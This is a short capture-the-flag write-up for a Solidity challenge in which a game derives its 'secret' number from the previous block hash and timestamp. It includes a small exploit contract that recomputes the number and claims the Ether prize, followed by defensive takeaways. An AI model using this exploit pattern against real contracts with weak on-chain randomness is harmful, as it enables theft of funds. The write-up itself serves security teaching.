# GuessTheNewNumberChallenge: Summary

## Intention

A game where players guess a secret number, generated using a previous block's hash and timestamp, to win Ether.

## Vulnerability

The contract uses publicly accessible blockchain data to generate the secret number, making it exploitable.

## Exploit

An attacker can create a contract, `GuessTheNewNumberExploit`, which interacts with the vulnerable contract by calculating the secret number using the same approach as the original contract. By calling the `guess()` function with the calculated secret number and sending the required Ether, the attacker can successfully exploit the vulnerability and claim the prize.

```solidity
contract GuessTheNewNumberExploit {
    GuessTheNewNumberChallenge public challengeContract;

    function GuessTheNewNumberExploit(address challengeAddress) public payable {
        challengeContract = GuessTheNewNumberChallenge(challengeAddress);
    }

    function exploit() public payable {
        require(msg.value == 1 ether);
        uint8 secretNumber = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        );

        // Call guess() function on the challenge contract with the secret number and send 1 Ether
        challengeContract.guess.value(1 ether)(secretNumber);

        // Transfer the remaining balance back to the sender
        msg.sender.transfer(address(this).balance);
    }

    // Fallback function to receive Ether
    function() public payable {}
}

## Takeaways

- Don't use public data for secret values in contracts.
- Be aware that attackers can deploy contracts to exploit vulnerabilities.
- Ensure security through audits and testing.

```
